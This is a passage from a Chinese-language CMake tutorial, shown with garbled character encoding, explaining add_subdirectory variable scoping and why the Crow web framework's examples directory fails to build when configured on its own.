<pre><code class="hljs language-cmake" lang="cmake"># examples/CMakeLists.txt
set(CHILD_VAR "child_value")       # å­ç›®å½•å˜é‡
add_executable(myapp main.cpp)     # å­ç›®å½•ç›®æ ‡

# æ ¹ç›®å½• CMakeLists.txtï¼ˆadd_subdirectory ä¹‹åï¼‰
message(STATUS ${CHILD_VAR})       # âŒ ä¸å¯è®¿é—®ï¼šå˜é‡æœªå®šä¹‰
# ä½†ç›®æ ‡ myapp åœ¨æ•´ä¸ªé¡¹ç›®ä¸­å¯è§
</code></pre>
</li>
<li>
<p><strong>å…³é”®å˜é‡è¡Œä¸º</strong>ï¼š</p>
<p><strong><code>CMAKE_SOURCE_DIR</code></strong>ï¼šå§‹ç»ˆæŒ‡å‘<strong>æ ¹é¡¹ç›®</strong>çš„æºç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
message(STATUS "Root: ${CMAKE_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow
add_subdirectory(examples)

# examples/CMakeLists.txt
message(STATUS "Examples: ${CMAKE_SOURCE_DIR}")  # C:/Users/notfr/projects/Crowï¼ˆç›¸åŒï¼ï¼‰
</code></pre>
<p><strong><code>CMAKE_CURRENT_SOURCE_DIR</code></strong>ï¼šæŒ‡å‘<strong>å½“å‰</strong>CMakeLists.txt æ‰€åœ¨çš„ç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
message(STATUS "Root current: ${CMAKE_CURRENT_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow
add_subdirectory(examples)

# examples/CMakeLists.txt
message(STATUS "Examples current: ${CMAKE_CURRENT_SOURCE_DIR}")  # C:/Users/notfr/projects/Crow/examples
</code></pre>
<p><strong><code>CMAKE_BINARY_DIR</code></strong>ï¼šå§‹ç»ˆæŒ‡å‘<strong>æ ¹é¡¹ç›®</strong>çš„æ„å»ºç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½•å’Œå­ç›®å½•çš„ CMAKE_BINARY_DIR éƒ½ç›¸åŒ
# ä¾‹å¦‚ï¼šC:/Users/notfr/projects/Crow/build
</code></pre>
<p><strong><code>CMAKE_CURRENT_BINARY_DIR</code></strong>ï¼šæŒ‡å‘<strong>å½“å‰</strong>CMakeLists.txt å¯¹åº”çš„æ„å»ºç›®å½•</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½•ï¼šC:/Users/notfr/projects/Crow/build
# examplesï¼šC:/Users/notfr/projects/Crow/build/examples
</code></pre>
</li>
<li>
<p><strong>ç›®æ ‡å¯è§æ€§</strong>ï¼š</p>
<ul>
<li>çˆ¶ç›®å½•åˆ›å»ºçš„ç›®æ ‡åœ¨å­ç›®å½•ä¸­<strong>å¯è§ä¸”å¯ç”¨</strong></li>
<li>å­ç›®å½•åˆ›å»ºçš„ç›®æ ‡åœ¨çˆ¶ç›®å½•ä¸­<strong>å¯è§</strong>ï¼ˆä½†å˜é‡ä¸å¯è§ï¼‰</li>
<li>æ‰€æœ‰ç›®æ ‡åœ¨æ•´ä¸ªé¡¹ç›®ä¸­å¯è§ï¼ˆé™¤éä½¿ç”¨ç‰¹æ®Šä½œç”¨åŸŸæ§åˆ¶ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å‡½æ•°å’Œå®çš„ä¼ é€’</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
include(cmake/compiler_options.cmake)  # å®šä¹‰å‡½æ•° add_warnings_optimizations()
add_subdirectory(examples)

# examples/CMakeLists.txt
add_warnings_optimizations(myapp)  # âœ… å¯ä»¥ä½¿ç”¨çˆ¶ç›®å½•å®šä¹‰çš„å‡½æ•°
</code></pre>
</li>
</ol>
<p><strong>å®é™…ä¾‹å­</strong>ï¼š</p>
<p>åœ¨ Crow é¡¹ç›®ä¸­ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># æ ¹ç›®å½• CMakeLists.txt
add_library(Crow INTERFACE)                    # åˆ›å»º Crow ç›®æ ‡
target_include_directories(Crow INTERFACE ...) # é…ç½® Crow
add_library(Crow::Crow ALIAS Crow)            # åˆ›å»ºåˆ«å

if(CROW_BUILD_EXAMPLES)
    add_subdirectory(examples)  # è¿›å…¥ examples ç›®å½•
endif()

# examples/CMakeLists.txt
add_executable(basic_example example.cpp)
target_link_libraries(basic_example PUBLIC Crow::Crow)  # âœ… å¯ä»¥ä½¿ç”¨çˆ¶ç›®å½•çš„ Crow::Crow
</code></pre>
<p><strong>æ‰§è¡Œæ—¶çš„å˜é‡å€¼</strong>ï¼š</p>






























<table><thead><tr><th>å˜é‡</th><th>æ ¹ç›®å½• CMakeLists.txt</th><th>examples/CMakeLists.txt</th></tr></thead><tbody><tr><td><code>CMAKE_SOURCE_DIR</code></td><td><code>C:/.../Crow</code></td><td><code>C:/.../Crow</code>ï¼ˆç›¸åŒï¼‰</td></tr><tr><td><code>CMAKE_CURRENT_SOURCE_DIR</code></td><td><code>C:/.../Crow</code></td><td><code>C:/.../Crow/examples</code></td></tr><tr><td><code>CMAKE_BINARY_DIR</code></td><td><code>C:/.../Crow/build</code></td><td><code>C:/.../Crow/build</code>ï¼ˆç›¸åŒï¼‰</td></tr><tr><td><code>CMAKE_CURRENT_BINARY_DIR</code></td><td><code>C:/.../Crow/build</code></td><td><code>C:/.../Crow/build/examples</code></td></tr></tbody></table>
<p><strong>æœ¬è´¨æ€»ç»“</strong>ï¼š</p>
<p><code>add_subdirectory</code> çš„æœ¬è´¨æ˜¯ï¼š</p>
<ol>
<li><strong>åˆ‡æ¢ç›®å½•</strong>ï¼šä¸´æ—¶åˆ‡æ¢åˆ°å­ç›®å½•ï¼Œæ‰§è¡Œå…¶ CMakeLists.txt</li>
<li><strong>åˆ›å»ºå­ä½œç”¨åŸŸ</strong>ï¼šå­ç›®å½•æœ‰è‡ªå·±çš„å˜é‡ä½œç”¨åŸŸï¼Œä½†å¯ä»¥è®¿é—®çˆ¶ç›®å½•çš„å˜é‡å’Œç›®æ ‡</li>
<li><strong>ä¿æŒä¸Šä¸‹æ–‡</strong>ï¼š<code>CMAKE_SOURCE_DIR</code> å§‹ç»ˆæŒ‡å‘æ ¹é¡¹ç›®ï¼Œä¿æŒé¡¹ç›®ç»“æ„çš„ä¸€è‡´æ€§</li>
<li><strong>ç›®æ ‡å…¨å±€å¯è§</strong>ï¼šæ‰€æœ‰ç›®æ ‡åœ¨æ•´ä¸ªé¡¹ç›®ä¸­å¯è§ï¼Œå®ç°ä¾èµ–ç®¡ç†</li>
<li><strong>å‡½æ•°ä¼ é€’</strong>ï¼šçˆ¶ç›®å½•å®šä¹‰çš„å‡½æ•°å’Œå®åœ¨å­ç›®å½•ä¸­å¯ç”¨</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½ä»å­ç›®å½•ç‹¬ç«‹æ‰§è¡Œï¼Ÿ</strong></p>
<p>å› ä¸º <code>add_subdirectory</code> åˆ›å»ºçš„æ˜¯<strong>å­ä½œç”¨åŸŸ</strong>ï¼Œä¸æ˜¯ç‹¬ç«‹é¡¹ç›®ï¼š</p>
<ul>
<li>å­ç›®å½•ä¾èµ–çˆ¶ç›®å½•çš„ä¸Šä¸‹æ–‡ï¼ˆå˜é‡ã€ç›®æ ‡ã€å‡½æ•°ï¼‰</li>
<li><code>CMAKE_SOURCE_DIR</code> å¿…é¡»æŒ‡å‘æ ¹é¡¹ç›®</li>
<li>å¦‚æœä»å­ç›®å½•æ‰§è¡Œï¼Œè¿™äº›ä¸Šä¸‹æ–‡éƒ½ä¸å­˜åœ¨ï¼Œä¼šå¤±è´¥</li>
</ul>
<p>è¿™æ˜¯ CMake çš„è®¾è®¡å“²å­¦ï¼š<strong>å­é¡¹ç›®æ˜¯çˆ¶é¡¹ç›®çš„ç»„æˆéƒ¨åˆ†ï¼Œä¸æ˜¯ç‹¬ç«‹é¡¹ç›®</strong>ã€‚</p>
<h4 data-id="heading-10">1.6 ç¼–è¯‘é€‰é¡¹å‡½æ•°å®šä¹‰</h4>
<p>æ ¹ç›®å½•é€šè¿‡åŒ…å« <code>compiler_options.cmake</code> å®šä¹‰äº† <code>add_warnings_optimizations()</code> å‡½æ•°ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake"># åœ¨ cmake/compiler_options.cmake ä¸­å®šä¹‰
function(add_warnings_optimizations target_name)
    # æ ¹æ®ç¼–è¯‘å™¨ç±»å‹ï¼ˆMSVCã€Clangã€GCCï¼‰è®¾ç½®ä¸åŒçš„è­¦å‘Šå’Œä¼˜åŒ–é€‰é¡¹
    ...
endfunction()
</code></pre>
<p>è¿™ä¸ªå‡½æ•°åœ¨ <code>examples/CMakeLists.txt</code> ä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-11">äºŒã€examples ç›®å½• CMakeLists.txt æ ¸å¿ƒå†…å®¹</h3>
<p><code>examples/CMakeLists.txt</code> æ˜¯ä¸€ä¸ª<strong>å­é¡¹ç›®</strong>çš„æ„å»ºæ–‡ä»¶ï¼Œå®ƒä¾èµ–äºçˆ¶ç›®å½•ï¼ˆæ ¹ç›®å½•ï¼‰æä¾›çš„æ‰€æœ‰åŸºç¡€è®¾æ–½ã€‚</p>
<h4 data-id="heading-12">2.1 é¡¹ç›®å£°æ˜</h4>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.15)
project(crow_examples)
</code></pre>
<ul>
<li><strong>æ³¨æ„</strong>ï¼šè¿™é‡Œè™½ç„¶å£°æ˜äº† <code>project(crow_examples)</code>ï¼Œä½†è¿™ä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®</li>
<li><strong>ä¸Šä¸‹æ–‡</strong>ï¼šå½“é€šè¿‡ <code>add_subdirectory(examples)</code> è°ƒç”¨æ—¶ï¼Œè¿™ä¸ª <code>project()</code> å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªå­é¡¹ç›®ï¼Œä½† <code>CMAKE_SOURCE_DIR</code> ä»ç„¶æŒ‡å‘æ ¹ç›®å½•</li>
</ul>
<h4 data-id="heading-13">2.2 ä¾èµ–çˆ¶ç›®å½•çš„ CMake æ¨¡å—</h4>
<pre><code class="hljs language-cmake" lang="cmake">include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)
</code></pre>
<p><strong>å…³é”®åˆ†æ</strong>ï¼š</p>
<ol>
<li><strong><code>CMAKE_SOURCE_DIR</code> çš„å«ä¹‰</strong>ï¼š
<ul>
<li>åœ¨æ ¹ç›®å½•æ‰§è¡Œ CMake æ—¶ï¼š<code>CMAKE_SOURCE_DIR</code> = é¡¹ç›®æ ¹ç›®å½•</li>
<li>åœ¨ <code>examples</code> ç›®å½•æ‰§è¡Œ CMake æ—¶ï¼š<code>CMAKE_SOURCE_DIR</code> = <code>examples</code> ç›®å½•</li>
</ul>
</li>
<li><strong>è·¯å¾„è§£æ</strong>ï¼š
<ul>
<li>ä»æ ¹ç›®å½•æ‰§è¡Œï¼š<code>${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake</code> = <code>æ ¹ç›®å½•/cmake/compiler_options.cmake</code> âœ…</li>
<li>ä» <code>examples</code> ç›®å½•æ‰§è¡Œï¼š<code>${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake</code> = <code>examples/cmake/compiler_options.cmake</code> âŒï¼ˆè·¯å¾„ä¸å­˜åœ¨ï¼‰</li>
</ul>
</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªåŸå› </strong>ï¼šè·¯å¾„è§£æé”™è¯¯ã€‚</p>
<h4 data-id="heading-14">2.3 ä¾èµ–çˆ¶ç›®å½•å®šä¹‰çš„ç›®æ ‡</h4>
<pre><code class="hljs language-cmake" lang="cmake">add_executable(basic_example example.cpp)
add_warnings_optimizations(basic_example)
target_link_libraries(basic_example PUBLIC Crow::Crow)
</code></pre>
<p><strong>ä¾èµ–é“¾åˆ†æ</strong>ï¼š</p>
<ol>
<li>
<p><strong><code>add_warnings_optimizations()</code> å‡½æ•°</strong>ï¼š</p>
<ul>
<li>å®šä¹‰åœ¨ <code>cmake/compiler_options.cmake</code> ä¸­</li>
<li>è¯¥æ–‡ä»¶é€šè¿‡ <code>include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)</code> å¼•å…¥</li>
<li>å¦‚æœè·¯å¾„è§£æå¤±è´¥ï¼Œå‡½æ•°ä¸å­˜åœ¨ï¼Œæ„å»ºä¼šå¤±è´¥</li>
</ul>
</li>
<li>
<p><strong><code>Crow::Crow</code> ç›®æ ‡</strong>ï¼š</p>
<ul>
<li>åœ¨æ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> ä¸­å®šä¹‰ï¼ˆç¬¬ 88-89 è¡Œï¼‰</li>
<li>æ˜¯ä¸€ä¸ª INTERFACE åº“ï¼ŒåŒ…å«ï¼š
<ul>
<li>å¤´æ–‡ä»¶è·¯å¾„ï¼š<code>${CMAKE_CURRENT_SOURCE_DIR}/include</code></li>
<li>é“¾æ¥åº“ï¼š<code>asio::asio</code>ï¼ˆæˆ– Boost åº“ï¼‰</li>
<li>ç¼–è¯‘å®šä¹‰ï¼š<code>ASIO_NO_DEPRECATED</code> ç­‰</li>
</ul>
</li>
<li>å¦‚æœä» <code>examples</code> ç›®å½•æ‰§è¡Œï¼Œè¿™ä¸ªç›®æ ‡ä¸å­˜åœ¨ï¼Œ<code>target_link_libraries()</code> ä¼šæŠ¥é”™</li>
</ul>
</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„ç¬¬äºŒä¸ªåŸå› </strong>ï¼šç›®æ ‡ä¸å­˜åœ¨ã€‚</p>
<h4 data-id="heading-15">2.4 ä¾èµ–çˆ¶ç›®å½•å®šä¹‰çš„å˜é‡</h4>
<pre><code class="hljs language-cmake" lang="cmake"># If compression is enabled, the example will be built
if("compression" IN_LIST CROW_FEATURES)
    add_executable(example_compression example_compression.cpp)
    ...
endif()

if(CROW_AMALGAMATE)
    add_executable(example_with_all example_with_all.cpp)
    add_dependencies(example_with_all crow_amalgamated)
    ...
endif()
</code></pre>
<p><strong>å˜é‡ä¾èµ–</strong>ï¼š</p>
<ol>
<li><strong><code>CROW_FEATURES</code></strong>ï¼šåœ¨æ ¹ç›®å½•çš„ CMakeLists.txt ä¸­æ ¹æ® <code>CROW_ENABLE_COMPRESSION</code> å’Œ <code>CROW_ENABLE_SSL</code> é€‰é¡¹è®¾ç½®</li>
<li><strong><code>CROW_AMALGAMATE</code></strong>ï¼šåœ¨æ ¹ç›®å½•å®šä¹‰ä¸º CMake é€‰é¡¹</li>
<li><strong><code>crow_amalgamated</code></strong>ï¼šåœ¨æ ¹ç›®å½•å®šä¹‰çš„è‡ªå®šä¹‰ç›®æ ‡ï¼ˆå¦‚æœå¯ç”¨äº† amalgamateï¼‰</li>
</ol>
<p><strong>è¿™æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•æ‰§è¡Œçš„ç¬¬ä¸‰ä¸ªåŸå› </strong>ï¼šå˜é‡æœªå®šä¹‰ã€‚</p>
<h3 data-id="heading-16">ä¸‰ã€ä¾èµ–å…³ç³»å›¾</h3>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           æ ¹ç›®å½• CMakeLists<span class="hljs-selector-class">.txt</span>                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">1</span>. é…ç½® CMAKE_MODULE_PATH                        â”‚   â”‚
â”‚  â”‚    â†’ æ·»åŠ  cmake/ ç›®å½•                            â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">2</span>. å®šä¹‰ Crow::Crow INTERFACE åº“                   â”‚   â”‚
â”‚  â”‚    â†’ åŒ…å«ç›®å½•: include/                          â”‚   â”‚
â”‚  â”‚    â†’ é“¾æ¥åº“: asio::asio                          â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">3</span>. æŸ¥æ‰¾ä¾èµ–åº“                                     â”‚   â”‚
â”‚  â”‚    â†’ <span class="hljs-built_in">find_package</span>(asio)                          â”‚   â”‚
â”‚  â”‚    â†’ <span class="hljs-built_in">find_package</span>(ZLIB) [å¯é€‰]                   â”‚   â”‚
â”‚  â”‚    â†’ <span class="hljs-built_in">find_package</span>(OpenSSL) [å¯é€‰]                â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">4</span>. è®¾ç½®å˜é‡                                       â”‚   â”‚
â”‚  â”‚    â†’ CROW_FEATURES                               â”‚   â”‚
â”‚  â”‚    â†’ CROW_AMALGAMATE                             â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">5</span>. <span class="hljs-built_in">add_subdirectory</span>(examples)                    â”‚   â”‚
â”‚  â”‚    â†’ æ‰§è¡Œ examples/CMakeLists.txt                â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                        â”‚ ä¾èµ–
                        â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         examples/CMakeLists.txt                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">1</span>. <span class="hljs-built_in">include</span>(${CMAKE_SOURCE_DIR}/cmake/...)        â”‚   â”‚
â”‚  â”‚    â† éœ€è¦æ ¹ç›®å½•çš„ cmake/ ç›®å½•                     â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">2</span>. <span class="hljs-built_in">add_warnings_optimizations</span>()                  â”‚   â”‚
â”‚  â”‚    â† éœ€è¦ compiler_options<span class="hljs-selector-class">.cmake</span> ä¸­çš„å‡½æ•°       â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">3</span>. <span class="hljs-built_in">target_link_libraries</span>(..., Crow::Crow)       â”‚   â”‚
â”‚  â”‚    â† éœ€è¦æ ¹ç›®å½•å®šä¹‰çš„ Crow::Crow ç›®æ ‡            â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ <span class="hljs-number">4</span>. <span class="hljs-built_in">if</span>(<span class="hljs-string">"compression"</span> IN_LIST CROW_FEATURES)      â”‚   â”‚
â”‚  â”‚    â† éœ€è¦æ ¹ç›®å½•è®¾ç½®çš„ CROW_FEATURES å˜é‡         â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-17">å››ã€ä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œ</h3>
<h4 data-id="heading-18">4.1 è·¯å¾„è§£æé—®é¢˜</h4>
<p><strong>åœºæ™¯</strong>ï¼šåœ¨ <code>examples</code> ç›®å½•æ‰§è¡Œ <code>cmake .</code></p>
<pre><code class="hljs language-cmake" lang="cmake">include(${CMAKE_SOURCE_DIR}/cmake/compiler_options.cmake)
</code></pre>
<ul>
<li><code>CMAKE_SOURCE_DIR</code> = <code>C:/Users/notfr/projects/Crow/examples</code></li>
<li>è§£æè·¯å¾„ï¼š<code>examples/cmake/compiler_options.cmake</code> âŒ</li>
<li>å®é™…è·¯å¾„ï¼š<code>æ ¹ç›®å½•/cmake/compiler_options.cmake</code> âœ…</li>
</ul>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">CMake</span> <span class="hljs-title class_">Error</span> at <span class="hljs-title class_">CMakeLists</span>.<span class="hljs-property">txt</span>:<span class="hljs-number">4</span> (include):
  include could not find load <span class="hljs-attr">file</span>:
    <span class="hljs-attr">C</span>:<span class="hljs-regexp">/Users/</span>notfr/projects/<span class="hljs-title class_">Crow</span>/examples/cmake/compiler_options.<span class="hljs-property">cmake</span>
</code></pre>
<h4 data-id="heading-19">4.2 ç›®æ ‡ä¸å­˜åœ¨é—®é¢˜</h4>
<p><strong>åœºæ™¯</strong>ï¼šå³ä½¿ä¿®å¤äº†è·¯å¾„é—®é¢˜ï¼Œç»§ç»­æ‰§è¡Œ</p>
<pre><code class="hljs language-cmake" lang="cmake">target_link_libraries(basic_example PUBLIC Crow::Crow)
</code></pre>
<ul>
<li><code>Crow::Crow</code> ç›®æ ‡åœ¨æ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> ä¸­å®šä¹‰</li>
<li>ä» <code>examples</code> ç›®å½•æ‰§è¡Œæ—¶ï¼Œæ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> æœªæ‰§è¡Œ</li>
<li>ç›®æ ‡ä¸å­˜åœ¨</li>
</ul>
<p><strong>é”™è¯¯ä¿¡æ¯</strong>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">CMake Error at CMakeLists.txt:<span class="hljs-number">40</span> (target_link_libraries):
  Cannot specify link libraries <span class="hljs-keyword">for</span> target <span class="hljs-string">"basic_example"</span> which <span class="hljs-keyword">is</span> not
  built <span class="hljs-keyword">by</span> <span class="hljs-keyword">this</span> project.
  
  CMake Error: The following variables are used <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> project, but they are
  <span class="hljs-keyword">set</span> to NOTFOUND.
  Please <span class="hljs-keyword">set</span> them or make sure they are <span class="hljs-keyword">set</span> correctly:
  Crow::Crow
</code></pre>
<h4 data-id="heading-20">4.3 ä¾èµ–åº“æœªæŸ¥æ‰¾é—®é¢˜</h4>
<p>å³ä½¿æ‰‹åŠ¨åˆ›å»ºäº† <code>Crow::Crow</code> ç›®æ ‡ï¼Œè¿˜éœ€è¦ï¼š</p>
<ol>
<li>
<p><strong>æŸ¥æ‰¾ asio åº“</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">find_package(asio REQUIRED)
</code></pre>
<ul>
<li>éœ€è¦æ ¹ç›®å½•çš„ <code>cmake/Findasio.cmake</code> æ¨¡å—</li>
<li>éœ€è¦æ­£ç¡®çš„ <code>CMAKE_MODULE_PATH</code> é…ç½®</li>
</ul>
</li>
<li>
<p><strong>è®¾ç½®åŒ…å«ç›®å½•</strong>ï¼š</p>
<pre><code class="hljs language-cmake" lang="cmake">target_include_directories(Crow INTERFACE ${CMAKE_CURRENT_SOURCE_DIR}/include)
</code></pre>
<ul>
<li><code>CMAKE_CURRENT_SOURCE_DIR</code> åœ¨ <code>examples</code> ç›®å½•æ‰§è¡Œæ—¶æŒ‡å‘ <code>examples</code></li>
